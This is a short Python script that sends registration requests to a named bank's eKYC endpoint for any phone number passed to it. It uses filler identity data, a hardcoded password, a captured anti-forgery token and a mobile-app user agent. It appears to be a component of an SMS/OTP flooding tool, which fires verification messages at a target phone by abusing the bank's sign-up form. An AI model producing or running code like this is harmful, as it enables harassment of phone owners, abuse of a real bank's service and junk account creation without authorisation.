import requests

def send_request(phone_number):
    # Endpoint URL
    url = "https://mtbekyc.mutualtrustbank.com/Home/Register"

    # Headers
    headers = {
        "Host": "mtbekyc.mutualtrustbank.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "okhttp/4.10.0"
    }

    # Payload
    data = {
        "name": "-",
        "email": "t73@gmail.com",
        "mobile": phone_number,
        "Password": "@Si123",
        "confirmPass": "@Si123",
        "__RequestVerificationToken": "CfDJ8H7XjXqOELtNgtQBTDTqOlXFlRqFhsADROj8xWdH6mBP6FaWtdbwUKtJY1rqBv2RlbOBMLba9p3HX3E1NO8AfKOmi3Mcj7lnY4gThTAhIPL5YLLEBiYd3S5GxrxgZim2QgklsskL8BxkmFKCWi73lr4",
    }

    try:
        # Sending POST request
        response = requests.post(url, headers=headers, data=data)
        return response.text
    except Exception as e:
        return str(e)